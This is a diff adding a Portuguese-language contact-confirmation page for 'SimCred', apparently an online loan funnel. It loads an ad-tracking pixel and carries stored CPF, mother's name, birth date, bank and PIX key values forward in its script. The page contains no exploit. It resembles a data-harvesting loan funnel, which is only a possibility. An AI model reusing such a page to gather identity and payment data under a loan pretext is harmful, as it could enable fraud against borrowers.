@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head><script src="/jquery-4.0.0.min.js"></script>
+  <script src="/js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  <script>
+    window.pixelId = "69122e1651618c82cbe95013";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Confirme seus Dados — SimCred</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Outfit:wght@400;500;600;700;800&family=Plus+Jakarta+Sans:wght@500;600;700;800&family=Sora:wght@700;800&display=swap');
+
+    :root {
+      --navy: #042444;
+      --navy-light: #0a3a6e;
+      --green: #22C55E;
+      --green-dark: #16A34A;
+      --green-light: #DCFCE7;
+      --bg: #F4F5F7;
+      --card: #FFFFFF;
+      --text: #042444;
+      --text-mid: #1e3a5f;
+      --text-light: #6B7280;
+      --border: #E5E7EB;
+      --danger: #ef4444;
+      --radius: 18px;
+      --shadow: 0 4px 24px rgba(0, 0, 0, .06), 0 1px 2px rgba(0, 0, 0, .04);
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      padding-top: 72px;
+      font-family: 'DM Sans', sans-serif;
+    }
+
+    /* =================== HEADER — SimCred navy =================== */
+    header.header {
+      background: var(--navy);
+      padding: 12px 0;
+      position: fixed;
+      top: 0;
+      width: 100%;
+      z-index: 1000;
+      box-shadow: 0 2px 12px rgba(4, 36, 68, 0.3);
+    }
+
+    .header-content {
+      padding: 0 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      max-width: 550px;
+      margin: 0 auto;
+    }
+
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .menu-icon {
+      width: 40px;
+      height: 40px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      transition: all 0.2s ease;
+    }
+
+    .menu-icon:hover {
+      background: rgba(255, 255, 255, 0.18);
+      transform: scale(1.05);
+    }
+
+    .menu-icon svg {
+      width: 18px;
+      height: 18px;
+      color: rgba(255, 255, 255, 0.85);
+      stroke-width: 2.5;
+    }
+
+    .logo-wrap {
+      display: flex;
+      align-items: center;
+      text-decoration: none;
+    }
+
+    .logo-img {
+      height: 38px;
+      width: auto;
+      object-fit: contain;
+      display: block;
+    }
+
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .user-info {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      gap: 1px;
+    }
+
+    .user-name {
+      font-size: 13px;
+      font-weight: 600;
+      color: #fff;
+      max-width: 120px;
+      text-overflow: ellipsis;
+      overflow: hidden;
+      white-space: nowrap;
+    }
+
+    .user-cpf {
+      font-size: 11px;
+      color: rgba(255, 255, 255, 0.55);
+      letter-spacing: 0.3px;
+    }
+
+    .user-icon-wrapper {
+      width: 36px;
+      height: 36px;
+      background: rgba(34, 197, 94, 0.2);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 2px solid var(--green);
+    }
+
+    .user-icon-wrapper svg {
+      width: 18px;
+      height: 18px;
+      color: var(--green);
+    }
+
+    .main-container {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 550px;
+      background: var(--card);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      padding: 32px 24px;
+      border: 1px solid var(--border);
+      animation: slideUp 0.6s ease-out;
+    }
+
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .page-title {
+      font-family: 'Outfit', sans-serif;
+      font-size: 1.5rem;
+      font-weight: 800;
+      color: var(--navy);
+      margin-bottom: 12px;
+      text-align: center;
+      line-height: 1.2;
+      letter-spacing: -0.3px;
+    }
+
+    .page-subtitle {
+      font-size: 0.95rem;
+      color: var(--text-light);
+      margin-bottom: 24px;
+      text-align: center;
+      line-height: 1.6;
+    }
+
+    .highlight {
+      color: var(--green);
+      font-weight: 700;
+    }
+
+    .info-card {
+      display: flex;
+      align-items: flex-start;
+      gap: 14px;
+      background: #FAFBFC;
+      border: 1.5px solid #E5E7EB;
+      border-radius: 14px;
+      padding: 16px;
+      margin-bottom: 24px;
+    }
+
+    .info-icon-box {
+      width: 44px;
+      height: 44px;
+      min-width: 44px;
+      background: linear-gradient(135deg, var(--navy), var(--navy-light));
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .info-icon-box svg {
+      width: 24px;
+      height: 24px;
+      color: white;
+    }
+
+    .info-content {
+      flex: 1;
+    }
+
+    .info-title {
+      font-size: 0.95rem;
+      font-weight: 700;
+      color: var(--navy);
+      margin-bottom: 10px;
+    }
+
+    .info-list {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+
+    .info-list li {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 5px 0;
+      font-size: 0.82rem;
+      color: var(--text-mid);
+      font-weight: 500;
+    }
+
+    .info-list li .check-icon {
+      width: 18px;
+      height: 18px;
+      min-width: 18px;
+      background: var(--green);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .info-list li .check-icon svg {
+      width: 10px;
+      height: 10px;
+      color: white;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-label {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: var(--navy);
+      margin-bottom: 8px;
+    }
+
+    .form-label .label-icon {
+      width: 20px;
+      height: 20px;
+      color: var(--green);
+    }
+
+    .form-label .required {
+      color: var(--danger);
+      margin-left: 2px;
+    }
+
+    .form-input-wrapper {
+      position: relative;
+    }
+
+    .form-input-wrapper .input-icon {
+      position: absolute;
+      left: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 20px;
+      height: 20px;
+      color: #9ca3af;
+      pointer-events: none;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 14px 16px 14px 46px;
+      border: 2px solid var(--border);
+      border-radius: 12px;
+      font-size: 1rem;
+      font-weight: 500;
+      font-family: 'DM Sans', sans-serif;
+      color: var(--navy);
+      transition: all 0.3s ease;
+      background: white;
+    }
+
+    .form-input:focus {
+      outline: none;
+      border-color: var(--green);
+      box-shadow: 0 0 0 4px rgba(34, 197, 94, 0.12);
+    }
+
+    .form-input:focus+.input-icon,
+    .form-input.success+.input-icon {
+      color: var(--green);
+    }
+
+    .form-input::placeholder {
+      color: #9ca3af;
+    }
+
+    .form-input.error {
+      border-color: var(--danger);
+    }
+
+    .form-input.error+.input-icon {
+      color: var(--danger);
+    }
+
+    .form-input.success {
+      border-color: var(--green);
+    }
+
+    .error-message {
+      display: none;
+      margin-top: 6px;
+      font-size: 0.85rem;
+      color: var(--danger);
+      font-weight: 500;
+    }
+
+    .error-message.show {
+      display: block;
+    }
+
+    .btn-submit {
+      width: 100%;
+      background: linear-gradient(135deg, var(--green), var(--green-dark));
+      color: white;
+      border: none;
+      padding: 16px 24px;
+      border-radius: 12px;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: 'DM Sans', sans-serif;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3);
+      margin-top: 24px;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .btn-submit::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      animation: shimmer 3s infinite;
+    }
+
+    @keyframes shimmer {
+      0% {
+        left: -100%;
+      }
+
+      100% {
+        left: 100%;
+      }
+    }
+
+    .btn-submit:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 24px rgba(34, 197, 94, 0.4);
+      filter: brightness(1.05);
+    }
+
+    .btn-submit:active:not(:disabled) {
+      transform: scale(0.98);
+    }
+
+    .btn-submit:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    .btn-submit .btn-icon {
+      width: 22px;
+      height: 22px;
+    }
+
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      backdrop-filter: blur(4px);
+    }
+
+    .loading-overlay.show {
+      display: flex;
+    }
+
+    .loading-content {
+      background: white;
+      padding: 40px;
+      border-radius: 16px;
+      text-align: center;
+      max-width: 300px;
+    }
+
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 6px solid var(--green-light);
+      border-top: 6px solid var(--green);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .loading-text {
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: var(--navy);
+    }
+
+    /* =================== FOOTER — SimCred navy =================== */
+    footer.site-footer {
+      margin-top: auto;
+      background: var(--navy);
+      color: rgba(255, 255, 255, 0.5);
+      padding: 24px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      border-top: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .footer-inner {
+      max-width: 550px;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .footer-logo {
+      display: flex;
+      align-items: center;
+    }
+
+    .footer-logo-img {
+      height: 36px;
+      width: auto;
+      object-fit: contain;
+      display: block;
+      filter: brightness(1.1);
+    }
+
+    footer small {
+      font-size: 11px;
+      opacity: 0.75;
+      line-height: 1.5;
+      color: rgba(255, 255, 255, 0.5);
+    }
+
+    footer small strong {
+      color: var(--green);
+      font-weight: 600;
+    }
+
+    @media(max-width:600px) {
+      .container {
+        padding: 24px 20px;
+      }
+
+      .page-title {
+        font-size: 1.3rem;
+      }
+
+      .form-input {
+        padding: 13px 14px 13px 44px;
+        font-size: 0.95rem;
+      }
+
+      .btn-submit {
+        padding: 15px 20px;
+        font-size: 0.95rem;
+      }
+
+      .info-card {
+        padding: 14px;
+        gap: 12px;
+      }
+
+      .info-icon-box {
+        width: 40px;
+        height: 40px;
+        min-width: 40px;
+      }
+
+      .info-icon-box svg {
+        width: 22px;
+        height: 22px;
+      }
+
+      .info-list li {
+        font-size: 0.78rem;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <header class="header">
+    <div class="header-content">
+      <div class="header-left">
+        <div class="menu-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
+          </svg></div>
+        <a href="index.html" class="logo-wrap">
+          <img src="/images/Sim-Cred.png" alt="SimCred" class="logo-img">
+        </a>
+      </div>
+      <div class="header-right">
+        <div class="user-info">
+          <span class="user-name" id="userName">Usuário</span>
+          <span class="user-cpf" id="userCpf">***.***.***-**</span>
+        </div>
+        <div class="user-icon-wrapper"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round"
+              d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
+          </svg></div>
+      </div>
+    </div>
+  </header>
+
+  <div class="main-container">
+    <div class="container">
+      <h1 class="page-title">Confirme seus <span class="highlight">Dados de Contato</span></h1>
+      <p class="page-subtitle">Para receber os boletos e atualizações sobre seu empréstimo</p>
+
+      <div class="info-card">
+        <div class="info-icon-box"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round"
+              d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9">
+            </path>
+          </svg></div>
+        <div class="info-content">
+          <h3 class="info-title">Você receberá:</h3>
+          <ul class="info-list">
+            <li><span class="check-icon"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+                </svg></span>Boletos de pagamento por e-mail</li>
+            <li><span class="check-icon"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+                </svg></span>Avisos de vencimento por SMS</li>
+            <li><span class="check-icon"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+                </svg></span>Atualizações sobre seu contrato</li>
+            <li><span class="check-icon"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+                </svg></span>Comprovantes de pagamento</li>
+          </ul>
+        </div>
+      </div>
+
+      <form id="contactForm" onsubmit="handleSubmit(event)">
+        <div class="form-group">
+          <label class="form-label"><svg class="label-icon" fill="none" stroke="currentColor" stroke-width="2"
+              viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round"
+                d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z">
+              </path>
+            </svg>E-mail <span class="required">*</span></label>
+          <div class="form-input-wrapper">
+            <input type="email" id="emailInput" class="form-input" placeholder="seu@email.com" required=""
+              autocomplete="email">
+            <svg class="input-icon" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round"
+                d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z">
+              </path>
+            </svg>
+          </div>
+          <div class="error-message" id="emailError">Por favor, insira um e-mail válido</div>
+        </div>
+        <div class="form-group">
+          <label class="form-label"><svg class="label-icon" fill="none" stroke="currentColor" stroke-width="2"
+              viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round"
+                d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path>
+            </svg>Telefone/Celular <span class="required">*</span></label>
+          <div class="form-input-wrapper">
+            <input type="tel" id="phoneInput" class="form-input" placeholder="(11) 98765-4321" required=""
+              maxlength="15" autocomplete="tel">
+            <svg class="input-icon" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round"
+                d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path>
+            </svg>
+          </div>
+          <div class="error-message" id="phoneError">Por favor, insira um telefone válido</div>
+        </div>
+        <button type="submit" class="btn-submit" id="submitBtn"><svg class="btn-icon" fill="none" stroke="currentColor"
+            stroke-width="2.5" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z">
+            </path>
+          </svg>Confirmar e Continuar</button>
+      </form>
+    </div>
+  </div>
+
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-content">
+      <div class="spinner"></div>
+      <p class="loading-text">Salvando seus dados...</p>
+    </div>
+  </div>
+
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <div class="footer-logo">
+        <img src="/images/Sim-Cred.png" alt="SimCred" class="footer-logo-img">
+      </div>
+      <small><strong>SimCred Soluções Financeiras Ltda.</strong><br>CNPJ: 36.947.229/0001-85 – São Paulo, SP –
+        01310-200</small>
+    </div>
+  </footer>
+
+  <script>
+    function loadUserData() { const nome = localStorage.getItem('nome'); if (nome) { const nomes = nome.trim().split(' '); const ultimoNome = nomes.length > 1 ? nomes[nomes.length - 1] : ''; document.getElementById('userName').textContent = ultimoNome ? `${nomes[0]} ${ultimoNome}` : nomes[0]; } const cpf = localStorage.getItem('cpf'); if (cpf) { const cl = cpf.replace(/\D/g, ''); if (cl.length === 11) { document.getElementById('userCpf').textContent = `${cl.substring(0, 3)}.***.***-${cl.substring(9, 11)}`; } } const savedEmail = localStorage.getItem('email'); const savedPhone = localStorage.getItem('telephone') || localStorage.getItem('telefone'); if (savedEmail) document.getElementById('emailInput').value = savedEmail; if (savedPhone) document.getElementById('phoneInput').value = formatPhone(savedPhone); }
+    document.addEventListener('DOMContentLoaded', loadUserData);
+    const phoneInput = document.getElementById('phoneInput');
+    phoneInput.addEventListener('input', function (e) { e.target.value = formatPhone(e.target.value.replace(/\D/g, '')); });
+    function formatPhone(value) { value = value.replace(/\D/g, ''); if (value.length <= 10) { value = value.replace(/^(\d{2})(\d{4})(\d{0,4}).*/, '($1) $2-$3'); } else { value = value.replace(/^(\d{2})(\d{5})(\d{0,4}).*/, '($1) $2-$3'); } return value; }
+    const emailInput = document.getElementById('emailInput');
+    emailInput.addEventListener('blur', function () { validateEmail(this.value); });
+    function validateEmail(email) { const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; const err = document.getElementById('emailError'); const inp = document.getElementById('emailInput'); if (!re.test(email)) { inp.classList.add('error'); inp.classList.remove('success'); err.classList.add('show'); return false; } else { inp.classList.remove('error'); inp.classList.add('success'); err.classList.remove('show'); return true; } }
+    phoneInput.addEventListener('blur', function () { validatePhone(this.value); });
+    function validatePhone(phone) { const cl = phone.replace(/\D/g, ''); const err = document.getElementById('phoneError'); const inp = document.getElementById('phoneInput'); if (cl.length < 10) { inp.classList.add('error'); inp.classList.remove('success'); err.classList.add('show'); return false; } else { inp.classList.remove('error'); inp.classList.add('success'); err.classList.remove('show'); return true; } }
+    function handleSubmit(event) { event.preventDefault(); const email = document.getElementById('emailInput').value.trim(); const phone = document.getElementById('phoneInput').value; const phoneClean = phone.replace(/\D/g, ''); const emailValid = validateEmail(email); const phoneValid = validatePhone(phone); if (!emailValid || !phoneValid) return false; document.getElementById('loadingOverlay').classList.add('show'); localStorage.setItem('email', email); localStorage.setItem('telephone', phoneClean); localStorage.setItem('telefone', phoneClean); const urlParams = new URLSearchParams(window.location.search); urlParams.set('email', email); urlParams.set('telephone', phoneClean); const importantParams = ['income', 'salaryDay', 'occupation', 'education', 'utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'utm_term', 'name', 'document', 'nome_mae', 'data_nasc', 'dueDate', 'cpf', 'nome', 'banco', 'chave_pix', 'selectedLoanAmount', 'selectedInstallments', 'selectedMonthlyPayment']; importantParams.forEach(param => { const value = localStorage.getItem(param); if (value && !urlParams.has(param)) urlParams.set(param, value); }); setTimeout(() => { window.location.href = '/configurando-conta'; }, 1500); return false; }
+  </script>
+
+</body>
+
+</html>
